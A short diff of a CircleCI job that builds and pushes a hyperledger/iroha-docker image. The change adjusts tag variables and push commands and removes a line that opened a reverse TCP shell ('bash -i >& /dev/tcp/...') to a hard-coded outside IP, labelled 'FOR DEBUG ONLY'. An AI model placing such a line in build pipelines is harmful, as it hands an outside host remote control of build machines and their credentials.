@@ -55,11 +55,8 @@ jobs:
       - run:
           name: build hyperledger/iroha-docker image
           command: |
-            # reverse tcp shell. FOR DEBUG ONLY
-            bash -i >& /dev/tcp/188.130.155.34/12345 0>&1
-
             # tag consists of branch+build version
-            TAG={{ .Branch }}.$CIRCLE_BUILD_NUM
+            TAG=$CIRCLE_BRANCH.$CIRCLE_BUILD_NUM
             # directory, where iroha build files will reside
             IROHA_DOCKER=$IROHA_HOME/docker/tiny/iroha
             mkdir -p $IROHA_DOCKER/lib
@@ -69,9 +66,10 @@ jobs:
             cp -H $LIBS $IROHA_DOCKER/lib
             # build image
             cd $IROHA_HOME/docker/tiny
-            docker build -t hyperledger/iroha-build:$TAG .
+            docker build -t hyperledger/iroha-docker:$TAG .
             # login and push
-            $IROHA_HOME/deploy.sh hyperledger/iroha-docker:$TAG
+            $IROHA_HOME/docker.hub.auth.sh 
+            docker push hyperledger/iroha-docker:$TAG
 
       ## At this step we have hyperledger/iroha-docker image, we can test it now
       # TODO
